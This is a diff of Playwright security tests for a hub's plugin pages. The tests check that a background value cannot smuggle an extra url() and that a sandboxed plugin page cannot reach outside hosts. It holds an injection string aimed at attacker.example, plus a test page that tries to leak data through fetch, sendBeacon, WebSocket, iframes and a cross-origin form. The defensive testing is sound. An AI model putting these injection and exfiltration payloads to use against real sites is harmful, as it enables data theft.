@@ -533,8 +533,8 @@ test("a plugin panel rearranges with the monitors", async ({ page }) => {
   await page.mouse.up();
 
   await expect.poll(tiles).not.toEqual(before);
-  const saved = await page.evaluate(() => (window as any).__sent.filter((c: any) => c.patch?.layout).pop());
-  expect(saved.patch.layout.monitors.order).toContain("pip");
+  const saved = () => page.evaluate(() => (window as any).__sent.filter((c: any) => c.patch?.layout).pop());
+  await expect.poll(async () => (await saved())?.patch.layout.monitors.order).toContain("pip");
 });
 
 
@@ -608,4 +608,54 @@ test("a background is only ever a base64 picture, so it cannot smuggle a second 
   expect(await paint(picture)).toBe(picture);
   expect(await paint('data:image/png;base64,AAAA"), url("https://attacker.example/?d=1')).toBeNull();
   expect(await paint("data:image/svg+xml;base64,PHN2Zy8+")).toBeNull();
+});
+
+const PAGE_POLICY = [...readFileSync(new URL("../../printguard/server/app.py", import.meta.url), "utf8").match(/PLUGIN_PAGE_CSP = \(([^)]*)\)/)![1].matchAll(/"([^"]*)"/g)]
+  .map((piece) => piece[1])
+  .join("");
+
+const OWN_PAGE = `<!doctype html><title>served</title>
+<style>body { color: rgb(1, 2, 3); }</style>
+<link rel="stylesheet" href="https://elsewhere.example/leak.css">
+<img src="https://elsewhere.example/leak.png"><img src="/api/v1/leak.png">
+<img id="inline" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==">
+<script src="https://elsewhere.example/leak.js"></script>
+<iframe src="https://elsewhere.example/leak-frame"></iframe>
+<form id="own" method="post" action="/plugins/demo/login"><input name="user" value="me"></form>
+<form id="away" method="post" action="https://elsewhere.example/leak-form"><input name="user" value="me"></form>
+<script>
+  const tried = [document.getElementById("inline").decode(), fetch("https://elsewhere.example/leak-fetch"), fetch("/api/health")];
+  navigator.sendBeacon("https://elsewhere.example/leak-beacon", "x");
+  try { new WebSocket("wss://elsewhere.example/leak-socket"); } catch {}
+  Promise.allSettled(tried).then((fetched) => {
+    document.title = [getComputedStyle(document.body).color, ...fetched.map((f) => f.status)].join(" ");
+  });
+</script>`;
+
+test("a plugin's own page styles, scripts and posts back to the hub, and reaches nothing else", async ({ page, baseURL }) => {
+  const asked: string[] = [];
+  await page.route(/elsewhere\.example|\/api\//, (route) => {
+    asked.push(route.request().url());
+    return route.fulfill({ contentType: "text/plain", body: "" });
+  });
+  await page.route("**/plugins/demo/**", (route) => {
+    const signedIn = route.request().method() === "POST";
+    return route.fulfill({
+      contentType: "text/html",
+      headers: { "Content-Security-Policy": PAGE_POLICY },
+      body: signedIn ? `<title>signed in as ${route.request().postData()}</title>` : OWN_PAGE,
+    });
+  });
+
+  expect(PAGE_POLICY).toContain("sandbox allow-forms allow-scripts");
+  expect(PAGE_POLICY).toContain("frame-ancestors 'none'");
+  await page.goto(`${baseURL}/plugins/demo/page`);
+  await expect(page).toHaveTitle("rgb(1, 2, 3) fulfilled rejected rejected");
+  await page.evaluate(() => (document.getElementById("away") as HTMLFormElement).submit());
+  await page.waitForTimeout(300);
+  expect(asked).toEqual([]);
+
+  await page.goto(`${baseURL}/plugins/demo/page`);
+  await page.evaluate(() => (document.getElementById("own") as HTMLFormElement).submit());
+  await expect(page).toHaveTitle("signed in as user=me");
 });
